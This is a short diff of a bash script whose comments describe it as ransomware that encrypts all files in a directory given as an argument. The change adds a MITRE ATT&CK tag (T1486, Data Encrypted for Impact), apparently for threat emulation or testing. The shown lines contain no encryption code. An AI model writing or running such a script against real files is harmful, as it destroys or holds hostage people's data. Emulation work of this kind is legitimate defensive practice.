@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # This script will act as a ransomware, crypting all the files in a specific directory
+# T1486 - Data Encrypted for Impact
 
 # Set the directory as an argument
 DIR=$1
